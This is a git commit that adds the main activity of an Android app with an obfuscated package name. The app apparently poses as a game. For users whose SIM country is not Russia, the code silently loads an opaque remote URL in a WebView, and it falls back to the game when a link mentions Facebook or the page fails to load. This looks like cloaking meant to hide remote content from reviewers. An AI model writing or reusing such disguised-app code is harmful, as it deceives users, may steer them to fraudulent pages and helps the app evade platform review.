c8f35b1c44657e6e6b37d9753a8a51e4e3b28a09
andrey.murzin <amurzin@smedialink.com>
2018-01-09 20:21:47 +0300

    first commit

---
+++ app/src/main/java/aorozh/cakgnrwapz/com/aorozh/MainActivity.java
@@ -0,0 +1,81 @@
+package aorozh.cakgnrwapz.com.aorozh;
+
+import android.content.Context;
+import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
+import android.telephony.TelephonyManager;
+import android.webkit.WebResourceError;
+import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+
+public class MainActivity extends AppCompatActivity {
+
+
+    private WebView webView;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        if (!getCountry() && isOnline()) {
+            webView = findViewById(R.id.web_view);
+            webView.setWebViewClient(new WebViewClient() {
+
+                @Override
+                public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                    if (!url.contains("facebook"))
+                        view.loadUrl(url);
+                    else showGame();
+                    return true;
+                }
+
+                @Override
+                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
+                    super.onReceivedError(view, request, error);
+                    showGame();
+                }
+
+                @Override
+                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
+                    super.onReceivedHttpError(view, request, errorResponse);
+                    showGame();
+                }
+            });
+            webView.loadUrl("http://plancial-kideased.com/6936ed7a-ffcd-471b-9f1a-067eb4ed5f10");
+        } else {
+            showGame();
+        }
+
+    }
+
+    private void showGame() {
+        Intent intent = new Intent(this, GameActivity.class);
+        startActivity(intent);
+        finish();
+    }
+
+
+    private boolean getCountry() {
+        String countryCodeValue = null;
+        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
+            countryCodeValue = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
+        else
+            return false;
+        return countryCodeValue != null && (countryCodeValue.equalsIgnoreCase("ru") || countryCodeValue.equalsIgnoreCase("rus"));
+    }
+
+
+    public boolean isOnline() {
+        NetworkInfo netInfo = null;
+        if (getSystemService(Context.CONNECTIVITY_SERVICE) != null)
+            netInfo = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
+        else return false;
+        return netInfo != null && netInfo.isConnectedOrConnecting();
+
+    }
+}
